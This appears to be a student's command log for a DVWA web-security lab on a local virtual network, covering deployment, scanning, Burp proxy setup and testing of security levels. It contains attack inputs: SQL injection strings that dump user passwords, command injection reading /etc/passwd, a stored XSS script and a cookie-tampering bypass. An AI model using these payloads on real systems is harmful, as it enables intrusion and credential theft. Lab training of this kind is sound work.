# Commands Reference: Lab 05

All commands used, in the order they were executed, without much explanation. See `README.md` for context, findings, and screenshots.

## Phase 0: Environment Verification

```bash
hostnamectl
ss -tuln
docker --version
systemctl is-enabled cups avahi-daemon
systemctl is-enabled cups.socket cups.path avahi-daemon.socket
sudo ufw status verbose
sudo auditctl -s
```

Removing the regressed CUPS/Avahi services outright (disabling had already proven insufficient once before):

```bash
sudo systemctl stop cups.service cups.socket cups.path avahi-daemon.service avahi-daemon.socket
sudo apt purge -y cups cups-daemon avahi-daemon
ss -tuln
```

## Phase 1: Deployment

```bash
sudo apt update
sudo apt install docker.io -y
sudo systemctl status docker

sudo docker pull vulnerables/web-dvwa
sudo docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
sudo docker ps
```

DVWA initial setup, via browser:

```
http://192.168.56.20/setup.php   -> Create / Reset Database
http://192.168.56.20/login.php   -> admin / password
```

## Phase 2: Enumeration

From Kali (native shell, not the SSH session into Ubuntu):

```bash
nmap -p 80 192.168.56.20
curl -I http://192.168.56.20
nikto -h http://192.168.56.20
```

From Ubuntu, confirming the firewall/Docker interaction found in Finding 1:

```bash
sudo ufw status verbose
sudo iptables -L DOCKER -n
sudo iptables -L FORWARD -n
```

## Phase 3: HTTP Analysis (Burp Suite)

```bash
burpsuite &
```

- New project: Temporary project in memory
- Proxy -> Intercept -> Intercept on
- Firefox: `about:preferences#general` -> Network Settings -> Manual proxy configuration -> HTTP Proxy `127.0.0.1`, Port `8080`, "Also use this proxy for HTTPS"
- Proxy -> Match and replace -> Add rule: Type = Request header, Match = `security=medium`, Replace = `security=low`
- Proxy -> Intercept -> Intercept off (once the rule is in place, to let traffic flow automatically)

## Phase 4: Vulnerability Assessment and Exploitation

**SQL Injection** (`/vulnerabilities/sqli/`), Security Level: Low

```
id=1
id=1' OR '1'='1
id=1' UNION SELECT user, password FROM users #
```

**OS Command Injection** (`/vulnerabilities/exec/`), Security Level: Low

```
127.0.0.1
127.0.0.1 && whoami
127.0.0.1 && cat /etc/passwd
```

**Stored XSS** (`/vulnerabilities/xss_s/`), Security Level: Low

```
Name: test
Message: <script>alert('XSS')</script>
```

## Phase 5: Mitigation Testing

Changed DVWA Security Level to Medium via the DVWA Security page, then:

```
http://192.168.56.20/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit#
```

(bypassing the dropdown-only UI restriction by editing the URL directly; the payload itself was blocked server-side)

## Phase 6: Cookie Tampering (Finding 6)

With the Burp Match and Replace rule active (`security=medium` -> `security=low`) and Intercept off:

```
http://192.168.56.20/vulnerabilities/sqli/
```

(page rendered as Low-level free-text field despite the real setting being Medium)

```
http://192.168.56.20/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit#
```

(full bypass restored, all 5 users returned, without ever touching the DVWA Security settings page)
